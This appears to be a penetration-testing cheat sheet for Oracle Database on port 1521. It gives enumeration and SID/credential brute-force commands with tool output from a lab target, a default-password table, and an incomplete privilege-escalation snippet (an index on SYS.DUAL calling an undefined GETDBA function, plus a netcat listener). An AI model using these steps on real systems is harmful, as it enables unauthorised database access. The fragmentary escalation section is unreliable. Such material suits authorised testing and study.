---
description: >-
  Oracle Database is a multi-model database management system produced and
  marketed by Oracle Corporation.
---

# 1521 - Oracle DB

Port: 1521

## Enumeration

### oscanner

Install oscanner: 

`apt-get install oscanner`   

Run oscanner: 

`oscanner -s 192.168.1.200 -P 1521`  

### tnscmd10g

Fingerprint Oracle TNS Version 

Fingerprint oracle tns: 

`tnscmd10g version -h TARGET` 

### Nmap

**Run nmap scripts against Oracle TNS:** 

`nmap -p 1521 -A TARGET` 

Find tns version:

`nmap --script=oracle-tns-version`  

**Brute force oracle user accounts** 

Identify default Oracle accounts: 

 `nmap --script=oracle-sid-brute`  

 `nmap --script=oracle-brute`  

### ODAT

ODAT \(Oracle Database Attacking Tool\) is an open source penetration testing tool that tests the security of Oracle Databases remotely. 

Usage examples of ODAT: 

* You have an Oracle database listening remotely and want to find valid SIDs and credentials in order to connect to the database 
* You have a valid Oracle account on a database and want to escalate your privileges to become DBA or SYSDBA 
* You have a Oracle account and you want to execute system commands \(e.g. reverse shell\) in order to move forward on the operating system hosting the database 

Tested on Oracle Database 10g, 11g, 12c and 18c. 

**Install**: 

`apt install odat` 

**Examples**: 

Identify SIDs 

```text
root@kali:/opt/odat-libc2.5-i686# odat sidguesser -s 10.10.10.82 
 
[1] (10.10.10.82:1521): Searching valid SIDs 
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server 
[+] 'XE' is a valid SID. Continue... 
[+] 'XEXDB' is a valid SID. Continue... 
100% |#####################################################################################################################################################| Time: 00:03:49 
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521) 
100% |#####################################################################################################################################################| Time: 00:00:09 
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521) 
[+] 'XE' is a valid SID. Continue... 
100% |#####################################################################################################################################################| Time: 00:03:20 
[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB 
```

### Metasploit

#### sid bruteforce:

```text
msf auxiliary(admin/oracle/sid_brute) > run 

[*] 10.10.10.82:1521 - Starting brute force on 10.10.10.82, using sids from /usr/share/metasploit-framework/data/wordlists/sid.txt... 
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'XE' 
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'PLSExtProc' 
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'CLRExtProc' 
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID '' 
[*] 10.10.10.82:1521 - Done with brute force... 
[*] Auxiliary module execution completed 
```

#### tns version:

```text
auxiliary/scanner/oracle/tnslsnr_version
```

#### sid enum:

```text
auxiliary/scanner/oracle/sid_enum
```

## Default accounts

| Username  | Password  |
| :--- | :--- |
| SYSTEM  | MANAGER  |
| SYS  | CHANGE\_ON\_INSTALL  |
| DBSNMP  | DBSNMP  |
| SCOTT  | TIGER  |

## Connecting to Oracle DB

To interact with Oracle from our Kali box, there are three tools that can come in handy. sqlplus is required for odat to work properly: 

Sqlplus will be installed with odat. So just install odat \(apt install odat\) 

```text
root@kali:~/hackthebox/silo# sqlplus SCOTT/tiger@10.10.10.82:1521/XE 
SQL*Plus: Release 12.2.0.1.0 Production on Thu Apr 26 08:54:27 2018 

Copyright (c) 1982, 2016, Oracle.  All rights reserved. 

Connected to: 
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production 
 
SQL> 
```

## Privilege escalation

 **Oracle priv esc and obtain DBA access:** 

**Run netcat**: netcat -nvlp 443 code 

`SQL> create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));` 

**Run the exploit with a select query:** 

`SQL> Select * from session_privs;`  

**Remove the exploit using:** 

`drop index exploit_1337;` 

